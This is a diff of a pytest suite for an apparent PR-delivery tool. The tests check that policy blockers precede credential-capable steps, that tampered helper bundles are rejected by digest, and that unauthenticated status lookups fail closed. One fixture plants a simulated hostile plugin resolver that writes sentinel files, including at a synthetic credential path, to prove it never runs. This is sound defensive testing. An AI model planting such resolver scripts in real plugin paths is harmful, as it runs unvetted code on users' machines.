@@ -4,6 +4,8 @@ import json
 import os
 import runpy
 import shlex
+import shutil
+import stat
 import subprocess
 import pytest
 import sys
@@ -11,7 +13,8 @@ from pathlib import Path
 
 
 ROOT = Path(__file__).resolve().parents[2]
-DELIVER = ROOT / "scripts" / "hermes-busdriver-deliver"
+DELIVER = ROOT / "tests" / "fixtures" / "verifier" / "hermes-busdriver-deliver-test-harness"
+PRODUCTION_DELIVER = ROOT / "scripts" / "hermes-busdriver-deliver"
 ARTIFACT_ENV = "HERMES_BUSDRIVER_DELIVERY_RUNS_DIR"
 BLOCKED_KEYS = [
     "finalization_allowed",
@@ -58,6 +61,22 @@ def fake_busdriver(path: Path) -> Path:
     return path
 
 
+def hostile_resolver_busdriver(path: Path, side_effects: list[Path]) -> Path:
+    plugin = fake_busdriver(path)
+    resolver = plugin / "scripts" / "lib" / "resolve-cli.sh"
+    resolver.parent.mkdir(parents=True, exist_ok=True)
+    resolver.write_text(
+        f"""#!/bin/sh
+for sentinel in {' '.join(shlex.quote(str(path)) for path in side_effects)}; do
+  printf 'synthetic sentinel\n' > "$sentinel"
+done
+printf '{{}}\n'
+"""
+    )
+    resolver.chmod(0o755)
+    return plugin
+
+
 def invoke(
     repo: Path,
     plugin: Path,
@@ -69,6 +88,14 @@ def invoke(
         env[ARTIFACT_ENV] = str(artifact_dir)
     cp = run([sys.executable, str(DELIVER), "--repo", str(repo), "--plugin-root", str(plugin), *extra], env=env)
     return cp, json.loads(cp.stdout)
+
+
+def test_production_help_discloses_process_scoped_status_authentication_boundary():
+    cp = run([sys.executable, str(PRODUCTION_DELIVER), "--help"])
+    assert cp.returncode == 0
+    assert "process-scoped" in cp.stdout
+    assert "cross-process" in cp.stdout
+    assert "artifact_writer_authentication_unavailable" in cp.stdout
 
 
 def safe_loop_decision(status: str = "clean", reason: str = "latest_pr_head_clean_read_only") -> dict:
@@ -90,12 +117,42 @@ def safe_loop_payload(status: str = "clean", ok: bool = True, clean: bool = True
         "version": 1,
         "ok": ok,
         "read_only": True,
+        "repo": "/tmp/repo",
+        "repository": "owner/repo",
+        "pr": 7,
+        "url": "https://github.com/owner/repo/pull/7",
         "status": status,
         "clean": clean,
-        "latest_head": "abc123",
+        "latest_head": "a" * 40,
+        "head_repository": "owner/repo",
+        "head_ref": "feature",
+        "base_repository": "owner/repo",
+        "base": "main",
+        "base_sha": "b" * 40,
         "decision": decision or safe_loop_decision(status, reason),
-        "iterations": [{"iteration": 1, "status": status, "head": "abc123"}],
+        "iterations": [{
+            "iteration": 1,
+            "elapsed_seconds": 0.0,
+            "source": "fixture",
+            "status": status,
+            "clean": clean,
+            "head": "a" * 40,
+            "base": "main",
+            "blockers": [],
+            "checks": {"failed": 0, "pending": 0, "mode": "all", "kept": 1, "source": "fixture"},
+            "actionable_comment_count": 0,
+            "decision_reason": reason,
+        }],
+        "policy_gaps": [],
+        "limits": {"max_wait_seconds": 1.0, "poll_interval": 0.0, "max_polls": 1, "max_fix_rounds": 0},
+        "elapsed_seconds": 0.0,
     }
+
+
+def bound_safe_loop_payload(repo: Path, repository: str = "owner/repo") -> dict:
+    payload = safe_loop_payload()
+    payload.update({"repo": str(repo), "repository": repository, "url": f"https://github.com/{repository}/pull/7", "head_repository": repository, "base_repository": repository})
+    return payload
 
 
 def delivery_status_for_mutation(repo: Path, decision_status: str, litmus_decision_status: str = "pr_review_fresh") -> dict:
@@ -161,6 +218,10 @@ def assert_run_authority_blocked(run: dict) -> None:
         assert authority[key] is False
 
 
+def mock_isolated_push(monkeypatch, globals_: dict, ok: bool) -> None:
+    monkeypatch.setitem(globals_, "run_isolated_push", lambda *_args: {"ok": ok, "returncode": 0 if ok else 1})
+
+
 def assert_delivery_run_envelope(run: dict, run_id: str, phase: str, status: str, reason: str) -> None:
     assert run["schema"] == "hermes-busdriver-delivery-run/v0"
     assert run["run_id"] == run_id
@@ -172,12 +233,19 @@ def assert_delivery_run_envelope(run: dict, run_id: str, phase: str, status: str
     assert_run_authority_blocked(run)
 
 
-def test_verifier_help_warns_commands_execute_locally():
+def test_deliver_help_discloses_fixed_production_blockers():
     cp = run([sys.executable, str(DELIVER), "--help"])
 
     assert cp.returncode == 0
-    assert "shell=False" in cp.stdout
-    assert "launch errors fail closed" in cp.stdout
+    for blocker in (
+        "verifier_containment_unavailable",
+        "isolated_review_runtime_unavailable",
+        "atomic_push_base_binding_unavailable",
+        "atomic_pr_create_binding_unavailable",
+        "atomic_merge_base_binding_unavailable",
+    ):
+        assert blocker in cp.stdout
+    assert "commit is the only mutating operation currently dispatchable" in cp.stdout
     assert "--pr-grind-loop-script" not in cp.stdout
 
 
@@ -231,7 +299,10 @@ def test_execute_mode_without_verify_operation_is_blocked_and_has_no_repo_side_e
     assert data["decision"]["status"] == "blocked"
     assert data["decision"]["reason"] == "unsupported_operation"
     assert_finalization_blocked(data["decision"])
-    assert data["steps"][0] == {"name": "execute", "status": "blocked", "reason": "unsupported_operation"}
+    assert data["steps"][:2] == [
+        {"name": "finalization_lock", "status": "skipped", "reason": "early_policy_blocker_before_lock"},
+        {"name": "plan", "status": "blocked", "reason": "unsupported_operation"},
+    ]
     assert data["verifiers"] == []
     assert data["run_artifact_path"] is None
     assert not (repo / ".claude").exists()
@@ -254,6 +325,304 @@ def test_execute_verify_without_verifiers_writes_handoff_artifact(tmp_path: Path
     artifact = Path(data["run_artifact_path"])
     assert artifact.exists()
     assert json.loads(artifact.read_text())["decision"]["reason"] == "no_verifiers"
+
+
+def test_production_execute_verify_blocks_before_sentinel_launch(tmp_path: Path):
+    repo = init_repo(tmp_path / "repo-verifier-policy")
+    plugin = fake_busdriver(tmp_path / "busdriver-verifier-policy")
+    artifact_dir = tmp_path / "delivery-runs"
+    sentinel = tmp_path / "verifier-ran"
+    env = {**os.environ, ARTIFACT_ENV: str(artifact_dir)}
+
+    cp = run(
+        [
+            sys.executable, str(PRODUCTION_DELIVER), "--repo", str(repo),
+            "--plugin-root", str(plugin), "--mode", "execute", "--operation", "verify",
+            "--verifier", f"sentinel=touch {sentinel}",
+        ],
+        env=env,
+    )
+    data = json.loads(cp.stdout)
+
+    assert cp.returncode == 2
+    assert data["ok"] is False
+    assert data["decision"] == {
+        "status": "blocked", "reason": "verifier_containment_unavailable",
+        **{key: False for key in BLOCKED_KEYS},
+    }
+    assert data["verifiers"] == []
+    assert not sentinel.exists()
+
+
+@pytest.mark.parametrize(
+    "operation_args",
+    [
+        [],
+        ["--mode", "execute", "--operation", "commit"],
+        ["--mode", "execute", "--operation", "pre-pr-review"],
+    ],
+    ids=["plan", "commit", "pre-pr-review"],
+)
+def test_production_delivery_never_executes_plugin_resolver_before_policy_boundary(
+    tmp_path: Path, operation_args: list[str]
+):
+    repo = init_repo(tmp_path / "repo-hostile-resolver")
+    baseline = tmp_path / "drift-baseline.json"
+    baseline.write_text("{}\n")
+    home = tmp_path / "home"
+    temp = tmp_path / "tmp"
+    relay_state = tmp_path / "relay-state"
+    delivery_runs = tmp_path / "delivery-runs"
+    home.mkdir()
+    temp.mkdir()
+    relay_state.mkdir()
+    delivery_runs.mkdir()
+    side_effects = {
+        "HOSTILE_RESOLVER_SENTINEL": tmp_path / "resolver-ran",
+        "SYNTHETIC_CREDENTIAL_SIDE_EFFECT": home / "synthetic-credential-side-effect",
+        "REPO_SIDE_EFFECT": repo / "resolver-repo-side-effect",
+        "STATE_SIDE_EFFECT": relay_state / "resolver-state-side-effect",
+        "LOCK_SIDE_EFFECT": relay_state / "resolver-lock-side-effect",
+        "RUN_SIDE_EFFECT": delivery_runs / "resolver-run-side-effect",
+    }
+    plugin = hostile_resolver_busdriver(tmp_path / "busdriver-hostile-resolver", list(side_effects.values()))
+    env = {
+        **os.environ,
+        "HOME": str(home),
+        "TMPDIR": str(temp),
+        "GIT_CONFIG_GLOBAL": os.devnull,
+        "GIT_CONFIG_NOSYSTEM": "1",
+        "PYTHONDONTWRITEBYTECODE": "1",
+        "HERMES_BUSDRIVER_RELAY_STATE": str(relay_state),
+        ARTIFACT_ENV: str(delivery_runs),
+        **{name: str(path) for name, path in side_effects.items()},
+    }
+
+    cp = run(
+        [
+            sys.executable,
+            str(PRODUCTION_DELIVER),
+            "--repo",
+            str(repo),
+            "--plugin-root",
+            str(plugin),
+            "--drift-baseline",
+            str(baseline),
+            *operation_args,
+        ],
+        env=env,
+    )
+
+    assert cp.returncode in {0, 2}
+    data = json.loads(cp.stdout)
+    if "pre-pr-review" in operation_args:
+        assert data["decision"]["reason"] == "isolated_review_runtime_unavailable"
+        assert data["delivery_status"] is None
+        assert data["run_artifact_path"] is None
+    else:
+        phase0 = data["delivery_status"]["phase0_status"]
+        assert phase0["status_schema"] == "hermes-busdriver-status/v0"
+        assert phase0["read_only"] is True
+        assert phase0["resolve_cli"] == {"ok": False, "error": "external_resolver_disabled"}
+        assert all(route["available"] is False and route["resolved"] is None for route in phase0["effective_routes"].values())
+    assert all(not path.exists() for path in side_effects.values())
+
+
+def test_private_relay_role_runtime_never_executes_default_plugin_resolver(tmp_path: Path):
+    repo = init_repo(tmp_path / "repo-relay-role-resolver")
+    home = tmp_path / "home"
+    temp = tmp_path / "tmp"
+    home.mkdir()
+    temp.mkdir()
+    sentinel = tmp_path / "relay-role-resolver-ran"
+    hostile_resolver_busdriver(
+        home / ".claude" / "plugins" / "marketplaces" / "busdriver",
+        [sentinel],
+    )
+    relay_config = tmp_path / "relay-config.json"
+    relay_config.write_text(json.dumps({
+        "coding_agent": "pi",
+        "avoid_coding_agent_for_review": True,
+        "routes": {"relay.pr.backstop": ["codex"]},
+    }))
+
+    cp = run(
+        [
+            sys.executable,
+            str(PRODUCTION_DELIVER),
+            "--repo",
+            str(repo),
+            "--relay-role",
+            "relay.pr.backstop",
+            "--relay-config",
+            str(relay_config),
+        ],
+        env={
+            **os.environ,
+            "HOME": str(home),
+            "TMPDIR": str(temp),
+            "GIT_CONFIG_GLOBAL": os.devnull,
+            "GIT_CONFIG_NOSYSTEM": "1",
+            "PYTHONDONTWRITEBYTECODE": "1",
+        },
+    )
+
+    assert cp.returncode == 0, cp.stderr
+    data = json.loads(cp.stdout)
+    assert data["decision"]["status"] == "plan_only"
+    assert data["delivery_status"]["relay_role_resolution"]["result"]["status"] == "resolved"
+    assert not sentinel.exists()
+
+
+def test_execute_verify_policy_blocker_precedes_delivery_status(monkeypatch, capsys, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    repo = init_repo(tmp_path / "repo-verifier-order")
+    called = []
+
+    def credential_capable_delivery_status(_args):
+        called.append("delivery-status")
+        raise AssertionError("credential-capable delivery status ran before verifier policy blocker")
+
+    monkeypatch.setitem(ns["main"].__globals__, "run_delivery_status", credential_capable_delivery_status)
+    monkeypatch.setattr(
+        sys,
+        "argv",
+        [
+            str(PRODUCTION_DELIVER),
+            "--repo", str(repo),
+            "--mode", "execute",
+            "--operation", "verify",
+            "--pr", "123",
+            "--verifier", "sentinel=true",
+        ],
+    )
+
+    rc = ns["main"]()
+    data = json.loads(capsys.readouterr().out)
+
+    assert rc == 2
+    assert called == []
+    assert data["decision"]["reason"] == "verifier_containment_unavailable"
+    assert data["delivery_status"] is None
+    assert data["run_artifact_path"] is None
+    assert data["verifiers"] == []
+    assert data["steps"][0] == {
+        "name": "verify",
+        "status": "blocked",
+        "reason": "verifier_containment_unavailable",
+    }
+    assert not {"delivery_status", "pr_grind"} & {step["name"] for step in data["steps"]}
+
+
+@pytest.mark.parametrize(
+    ("operation", "extra", "reason"),
+    [
+        ("plan", ["--pr", "123"], "unsupported_operation"),
+        ("pre-pr-review", [], "isolated_review_runtime_unavailable"),
+        ("push", [], "atomic_push_base_binding_unavailable"),
+        ("pr-create", ["--pr-title", "title"], "atomic_pr_create_binding_unavailable"),
+        ("merge", ["--pr", "123"], "atomic_merge_base_binding_unavailable"),
+    ],
+)
+def test_production_atomic_blockers_precede_delivery_status(
+    monkeypatch, capsys, operation: str, extra: list[str], reason: str
+):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+
+    def credential_capable_delivery_status(*_args, **_kwargs):
+        pytest.fail("credential-capable delivery status ran before atomic policy blocker")
+
+    monkeypatch.setitem(ns["main"].__globals__, "run_delivery_status", credential_capable_delivery_status)
+    monkeypatch.setitem(
+        ns["main"].__globals__,
+        "new_run_id",
+        lambda: pytest.fail("fixed blocker generated a run identity"),
+    )
+    monkeypatch.setattr(
+        sys,
+        "argv",
+        [
+            str(PRODUCTION_DELIVER),
+            "--mode", "execute",
+            "--operation", operation,
+            "--expected-repository", "owner/repo",
+            *extra,
+        ],
+    )
+
+    rc = ns["main"]()
+    data = json.loads(capsys.readouterr().out)
+
+    assert rc == 2
+    assert data["decision"]["reason"] == reason
+    assert data["delivery_status"] is None
+    assert data["run_artifact_path"] is None
+    assert data["run"]["run_id"] is None
+    assert data["run"]["created_at"] is None
+    assert data["steps"][0] == {
+        "name": "finalization_lock",
+        "status": "skipped",
+        "reason": "early_policy_blocker_before_lock",
+    }
+
+
+@pytest.mark.parametrize(
+    ("operation", "reason"),
+    [
+        ("plan", "unsupported_operation"),
+        ("pre-pr-review", "isolated_review_runtime_unavailable"),
+        ("push", "atomic_push_base_binding_unavailable"),
+    ],
+)
+def test_fixed_early_blocker_preserves_supplied_run_id_without_creating_timestamp(
+    monkeypatch, capsys, operation: str, reason: str
+):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    monkeypatch.setitem(
+        ns["main"].__globals__,
+        "run_delivery_status",
+        lambda *_args, **_kwargs: pytest.fail("delivery status ran before fixed blocker"),
+    )
+    monkeypatch.setattr(
+        sys,
+        "argv",
+        [
+            str(PRODUCTION_DELIVER),
+            "--mode", "execute",
+            "--operation", operation,
+            "--expected-repository", "owner/repo",
+            "--run-id", "caller-supplied-run",
+        ],
+    )
+
+    assert ns["main"]() == 2
+    data = json.loads(capsys.readouterr().out)
+    assert data["decision"]["reason"] == reason
+    assert data["run"]["run_id"] == "caller-supplied-run"
+    assert data["run"]["created_at"] is None
+    assert data["run_artifact_path"] is None
+
+
+def test_verify_fixed_blocker_precedes_run_identity_generation(monkeypatch, capsys):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    monkeypatch.setitem(
+        ns["main"].__globals__,
+        "new_run_id",
+        lambda: pytest.fail("verify fixed blocker generated a run identity"),
+    )
+    monkeypatch.setattr(
+        sys,
+        "argv",
+        [str(PRODUCTION_DELIVER), "--mode", "execute", "--operation", "verify"],
+    )
+
+    assert ns["main"]() == 2
+    data = json.loads(capsys.readouterr().out)
+    assert data["decision"]["reason"] == "verifier_containment_unavailable"
+    assert data["delivery_status"] is None
+    assert data["run"]["run_id"] is None
+    assert data["run"]["created_at"] is None
+    assert data["run_artifact_path"] is None
 
 
 def test_plan_mode_never_authorizes_clean_status(tmp_path: Path):
@@ -692,7 +1061,7 @@ def test_clean_pr_grind_fixture_still_does_not_authorize_merge(tmp_path: Path):
     assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
     (repo / "README.md").write_text("# test\n")
     assert run(["git", "add", "README.md"], repo).returncode == 0
-    assert run(["git", "commit", "-m", "init"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
     plugin = fake_busdriver(tmp_path / "busdriver")
     pr_result = tmp_path / "pr-grind-clean.json"
     pr_result.write_text(json.dumps({"status": "clean", "clean": True, "checks": {"failed": 0, "pending": 0}, "actionable_comments": []}))
@@ -801,8 +1170,40 @@ def test_execute_pr_grind_rejects_malformed_loop_output(monkeypatch, capsys, tmp
     assert Path(data["run_artifact_path"]).exists()
 
 
+def test_run_pr_grind_loop_rejects_bundle_tamper(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    tampered_loop = tmp_path / "loop"
+    trusted_check = tmp_path / "check"
+    tampered_loop.write_text("tampered\n")
+    trusted_check.write_text("trusted-check\n")
+    globals_ = ns["run_pr_grind_loop"].__globals__
+    monkeypatch.setitem(globals_, "PR_GRIND_LOOP", tampered_loop)
+    monkeypatch.setitem(globals_, "PR_GRIND_CHECK", trusted_check)
+    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_LOOP_SHA256", hashlib.sha256(b"trusted-loop\n").hexdigest())
+    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_CHECK_SHA256", hashlib.sha256(trusted_check.read_bytes()).hexdigest())
+    monkeypatch.setattr(subprocess, "run", lambda *_args, **_kwargs: pytest.fail("tampered loop must not execute"))
+    args = type("Args", (), {
+        "pr": "7", "max_wait_seconds": 1.0, "poll_interval": 0.0,
+        "max_polls": 1, "check_timeout": 1.0, "expected_repository": "owner/repo",
+        "plugin_root": None,
+    })()
+    data, rc = ns["run_pr_grind_loop"](tmp_path, args)
+    assert rc == 2
+    assert data["error"] == "pr_grind_bundle_integrity_failed"
+
+
 def test_run_pr_grind_loop_timeout_bytes_are_json_safe(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
+    globals_ = ns["run_pr_grind_loop"].__globals__
+    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_LOOP_SHA256", hashlib.sha256(globals_["PR_GRIND_LOOP"].read_bytes()).hexdigest())
+    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_CHECK_SHA256", hashlib.sha256(globals_["PR_GRIND_CHECK"].read_bytes()).hexdigest())
+    snapshot = {
+        "number": 7,
+        "html_url": "https://github.com/owner/repo/pull/7",
+        "head": {"sha": "a" * 40, "ref": "feature", "repo": {"full_name": "owner/repo"}},
+        "base": {"sha": "b" * 40, "ref": "main", "repo": {"full_name": "owner/repo"}},
+    }
+    monkeypatch.setitem(globals_, "github_pr_snapshot", lambda *_args: (snapshot, {"ok": True}, None))
 
     def raise_timeout(*_args, **_kwargs):
         raise subprocess.TimeoutExpired(cmd=["slow-loop"], timeout=1, output=b"partial", stderr=b"slow")
@@ -818,6 +1219,7 @@ def test_run_pr_grind_loop_timeout_bytes_are_json_safe(monkeypatch, tmp_path: Pa
             "max_polls": 1,
             "check_timeout": 1.0,
             "plugin_root": None,
+            "expected_repository": "owner/repo",
         },
     )()
 
@@ -827,6 +1229,74 @@ def test_run_pr_grind_loop_timeout_bytes_are_json_safe(monkeypatch, tmp_path: Pa
     assert data["stdout_tail"] == "partial"
     assert data["stderr_tail"] == "slow"
     json.dumps(data)
+
+
+def test_run_pr_grind_loop_passes_and_rechecks_exact_pr_identity(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    globals_ = ns["run_pr_grind_loop"].__globals__
+    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_LOOP_SHA256", hashlib.sha256(globals_["PR_GRIND_LOOP"].read_bytes()).hexdigest())
+    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_CHECK_SHA256", hashlib.sha256(globals_["PR_GRIND_CHECK"].read_bytes()).hexdigest())
+    snapshot = {
+        "number": 7,
+        "html_url": "https://github.com/owner/repo/pull/7",
+        "head": {"sha": "a" * 40, "ref": "feature", "repo": {"full_name": "fork/repo"}},
+        "base": {"sha": "b" * 40, "ref": "main", "repo": {"full_name": "owner/repo"}},
+    }
+    monkeypatch.setitem(globals_, "github_pr_snapshot", lambda *_args: (snapshot, {"ok": True}, None))
+    captured = {}
+
+    def fake_run(cmd, **kwargs):
+        captured["cmd"] = cmd
+        captured["env"] = kwargs["env"]
+        private_loop = Path(cmd[2])
+        captured["bundle"] = private_loop.parents[1]
+        captured["checker_exists"] = (captured["bundle"] / "scripts" / "hermes-busdriver-pr-grind-check").is_file()
+        captured["script_modes"] = {
+            name: stat.S_IMODE((captured["bundle"] / "scripts" / name).stat().st_mode)
+            for name in ("hermes-busdriver-pr-grind-loop", "hermes-busdriver-pr-grind-check")
+        }
+        captured["trusted_executables_exist"] = all((captured["bundle"] / "trusted-bin" / name).is_file() for name in ("git", "gh", "jq"))
+        payload = bound_safe_loop_payload(tmp_path)
+        payload.update({
+            "pr": 7,
+            "url": snapshot["html_url"],
+            "latest_head": "a" * 40,
+            "head_repository": "fork/repo",
+            "head_ref": "feature",
+            "base_repository": "owner/repo",
+            "base": "main",
+            "base_sha": "b" * 40,
+        })
+        return subprocess.CompletedProcess(cmd, 0, json.dumps(payload), "")
+
+    monkeypatch.setattr(ns["subprocess"], "run", fake_run)
+    args = type("Args", (), {
+        "pr": "7", "max_wait_seconds": 1.0, "poll_interval": 0.0,
+        "max_polls": 1, "check_timeout": 1.0, "expected_repository": "owner/repo",
+        "plugin_root": None,
+    })()
+
+    data, rc = ns["run_pr_grind_loop"](tmp_path, args)
+
+    assert rc == 0
+    assert data["latest_head"] == "a" * 40
+    for option, value in [
+        ("--expected-repository", "owner/repo"),
+        ("--expected-head-repository", "fork/repo"),
+        ("--expected-head-ref", "feature"),
+        ("--expected-base-repository", "owner/repo"),
+        ("--expected-base-ref", "main"),
+        ("--expected-head-sha", "a" * 40),
+        ("--expected-base-sha", "b" * 40),
+    ]:
+        assert captured["cmd"][captured["cmd"].index(option) + 1] == value
+    assert captured["env"]["HERMES_BUSDRIVER_PRIVATE_RUNTIME"] == "1"
+    assert captured["checker_exists"] is True
+    assert captured["script_modes"] == {
+        "hermes-busdriver-pr-grind-loop": 0o500,
+        "hermes-busdriver-pr-grind-check": 0o500,
+    }
+    assert captured["trusted_executables_exist"] is True
 
 
 def test_execute_pr_grind_rejects_mismatched_loop_decision_status(monkeypatch, capsys, tmp_path: Path):
@@ -909,6 +1379,18 @@ def test_execute_pr_grind_rejects_unsafe_loop_authority(monkeypatch, capsys, tmp
     assert_finalization_blocked(data["decision"])
     assert data["pr_grind_loop"]["decision"]["merge_allowed"] is True
     assert Path(data["run_artifact_path"]).exists()
+
+
+@pytest.mark.parametrize("field", [
+    "repo", "repository", "pr", "url", "latest_head", "head_repository", "head_ref",
+    "base_repository", "base", "base_sha", "iterations", "policy_gaps", "limits",
+])
+def test_delivery_loop_envelope_requires_identity_and_evidence(field: str):
+    ns = runpy.run_path(str(DELIVER))
+    payload = safe_loop_payload()
+    del payload[field]
+
+    assert ns["pr_grind_loop_envelope_safe"](payload) is False
 
 
 def test_execute_pr_grind_delivery_status_failure_writes_handoff_artifact(tmp_path: Path):
@@ -1137,30 +1619,23 @@ def test_status_mode_reads_latest_valid_artifact_for_run_id_without_writing(tmp_
 
     assert cp_first.returncode == 0
     assert cp_second.returncode == 0
-    assert cp.returncode == 0
+    assert cp.returncode == 1
     assert before == after
-    assert data["ok"] is True
+    assert data["ok"] is False
     assert data["mode"] == "status"
     assert data["operation"] == "status"
     assert data["run_artifact_path"] is None
-    assert data["status_lookup"]["found"] is True
+    assert data["status_lookup"]["found"] is False
     assert data["status_lookup"]["run_id"] == "lookup-123"
-    assert data["status_lookup"]["artifact_path"] == str(second_artifact)
-    assert data["status_lookup"]["artifact_run"]["run_id"] == "lookup-123"
-    assert data["status_lookup"]["artifact_schema"] == "hermes-busdriver-deliver/v0"
-    assert data["status_lookup"]["artifact_ok"] is True
-    assert data["status_lookup"]["artifact_run"]["artifacts"] == [{"kind": "result", "path": str(second_artifact)}]
-    assert "artifact" not in data["status_lookup"]
-    assert "verifiers" not in data["status_lookup"]
-    assert "do-not-echo" not in json.dumps(data["status_lookup"])
-    assert data["status_lookup"]["artifact_decision"]["status"] == "verified"
-    assert_delivery_run_envelope(data["run"], "lookup-123", "status", "found", "run_found")
-    assert data["run"]["repo_root"] == str(repo)
-    assert data["run"]["artifacts"] == [{"kind": "result", "path": str(second_artifact)}]
+    assert data["status_lookup"]["reason"] == "artifact_writer_authentication_unavailable"
+    assert "artifact_path" not in data["status_lookup"]
+    assert_delivery_run_envelope(
+        data["run"], "lookup-123", "status", "blocked", "artifact_writer_authentication_unavailable"
+    )
     assert_finalization_blocked(data["decision"])
 
 
-def test_status_mode_accepts_legacy_v1_artifact_without_marker_write_flag(tmp_path: Path):
+def test_status_mode_rejects_modified_legacy_v1_artifact_without_writer_authentication(tmp_path: Path):
     repo = init_repo(tmp_path / "repo")
     plugin = fake_busdriver(tmp_path / "busdriver")
     artifact_dir = tmp_path / "delivery-runs"
@@ -1187,11 +1662,10 @@ def test_status_mode_accepts_legacy_v1_artifact_without_marker_write_flag(tmp_pa
     cp, data = invoke(repo, plugin, "--mode", "status", "--run-id", "legacy-123", artifact_dir=artifact_dir)
 
     assert cp_verify.returncode == 0
-    assert cp.returncode == 0
-    assert data["status_lookup"]["found"] is True
-    assert data["status_lookup"]["artifact_path"] == str(artifact)
-    assert data["status_lookup"]["artifact_decision"]["marker_write_allowed"] is False
-    assert data["status_lookup"]["artifact_run"]["authority"]["marker_write_allowed"] is False
+    assert cp.returncode == 1
+    assert data["status_lookup"]["found"] is False
+    assert "artifact_path" not in data["status_lookup"]
+    assert data["status_lookup"]["reason"] == "artifact_writer_authentication_unavailable"
     assert_finalization_blocked(data["decision"])
 
 
@@ -1237,14 +1711,16 @@ def test_status_mode_returns_latest_valid_failed_delivery_status_artifact(tmp_pa
 
     assert cp_ok.returncode == 0
     assert cp_failed.returncode != 0
-    assert cp.returncode == 0
-    assert data["status_lookup"]["found"] is True
-    assert data["status_lookup"]["artifact_path"] == str(failed_artifact)
-    assert data["status_lookup"]["artifact_run"]["phase"] == "delivery_status"
-    assert data["status_lookup"]["artifact_run"]["status"] == "blocked"
-    assert data["status_lookup"]["artifact_run"]["reason"] == "delivery_status_failed"
+    assert cp.returncode == 1
+    assert data["status_lookup"] == {
+        "found": False,
+        "reason": "artifact_writer_authentication_unavailable",
+        "run_id": "lookup-failed-latest",
+    }
     assert data["run"]["phase"] == "status"
-    assert data["run"]["artifacts"] == [{"kind": "result", "path": str(failed_artifact)}]
+    assert data["run"]["status"] == "blocked"
+    assert data["run"]["reason"] == "artifact_writer_authentication_unavailable"
+    assert data["run"]["artifacts"] == []
     assert_finalization_blocked(data["decision"])
 
 
@@ -1515,9 +1991,264 @@ def test_artifact_write_failure_after_completed_mutation_preserves_side_effect_s
 
     assert rc == 1
     assert data["ok"] is False
-    assert data["decision"]["status"] == data["mutating_run"]["status"] == "committed_release_failed"
-    assert data["decision"]["reason"] == data["steps"][0]["reason"] == "artifact_write_failed_after_side_effect"
+    assert data["decision"]["status"] == data["run"]["status"] == data["mutating_run"]["status"] == "committed_release_failed"
+    assert data["decision"]["reason"] == data["run"]["reason"] == data["steps"][0]["reason"] == "artifact_write_failed_after_side_effect"
+    assert data["run"]["artifact_write_error"] == "artifact disk full"
+    assert data["run"]["artifacts"] == []
     assert data["mutating_run"]["artifact_write_error"] == "artifact disk full"
+
+
+def test_delivery_executes_materialized_lock_bytes_after_source_replacement(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    source = tmp_path / "lock-source"
+    trusted_bytes = b"#!/usr/bin/env python3\n# trusted\n"
+    source.write_bytes(trusted_bytes)
+    globals_ = ns["acquire_finalization_lock"].__globals__
+    monkeypatch.setitem(globals_, "LOCK_SOURCE", source)
+    monkeypatch.setitem(globals_, "TRUSTED_LOCK_SHA256", hashlib.sha256(trusted_bytes).hexdigest())
+    calls = []
+
+    def fake_run_lock_helper(cmd, timeout=30):
+        calls.append(cmd)
+        assert Path(cmd[2]).read_bytes() == trusted_bytes
+        source.write_text("raise SystemExit('mutable source executed')\n")
+        payload = {"acquired": True, "token": "token", "path": str(tmp_path / "canonical.lock")} if cmd[3] == "acquire" else {"released": True}
+        return payload, {"returncode": 0, "ok": True}
+
+    monkeypatch.setitem(globals_, "run_lock_helper", fake_run_lock_helper)
+    acquired = ns["acquire_finalization_lock"](tmp_path)
+    released = ns["release_finalization_lock"](
+        tmp_path, acquired["token"], None, acquired["path"], acquired["trusted_helper_path"]
+    )
+
+    assert acquired["acquired"] is True
+    assert released["released"] is True
+    assert calls[0][2] == calls[1][2]
+    assert calls[1][calls[1].index("--lock-path") + 1] == acquired["path"]
+
+
+def test_delivery_status_executes_authenticated_private_runtime(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    source = tmp_path / "hermes-busdriver-delivery-status"
+    trusted_bytes = b"#!/usr/bin/env python3\n# trusted delivery status\n"
+    source.write_bytes(trusted_bytes)
+    relative = "scripts/hermes-busdriver-delivery-status"
+    globals_ = ns["run_delivery_status"].__globals__
+    monkeypatch.setitem(globals_, "DELIVERY_STATUS_RUNTIME_SOURCES", {relative: source})
+    monkeypatch.setitem(
+        globals_,
+        "TRUSTED_DELIVERY_STATUS_RUNTIME_DIGESTS",
+        {relative: hashlib.sha256(trusted_bytes).hexdigest()},
+    )
+    trusted_executables = {}
+    trusted_digests = {}
+    for name in ("git", "gh", "jq"):
+        executable = tmp_path / f"trusted-{name}"
+        payload = f"trusted {name}\n".encode()
+        executable.write_bytes(payload)
+        executable.chmod(0o700)
+        trusted_executables[name] = executable
+        trusted_digests[name] = hashlib.sha256(payload).hexdigest()
+    monkeypatch.setitem(globals_, "TRUSTED_EXECUTABLE_DIGESTS", trusted_digests)
+    monkeypatch.setitem(globals_, "trusted_executable_path", lambda name: trusted_executables[name])
+    calls = []
+
+    def fake_run(cmd, **kwargs):
+        calls.append(cmd)
+        assert kwargs["env"]["HERMES_BUSDRIVER_PRIVATE_RUNTIME"] == "1"
+        private = Path(cmd[2])
+        assert private != source
+        assert private.read_bytes() == trusted_bytes
+        trusted_bin = Path(kwargs["env"]["PATH"].split(os.pathsep)[0])
+        for name, executable in trusted_executables.items():
+            private_executable = trusted_bin / name
+            assert private_executable != executable
+            assert private_executable.read_bytes() == executable.read_bytes()
+            assert private_executable.stat().st_mode & 0o777 == 0o500
+        source.write_text("raise SystemExit('mutable source executed')\n")
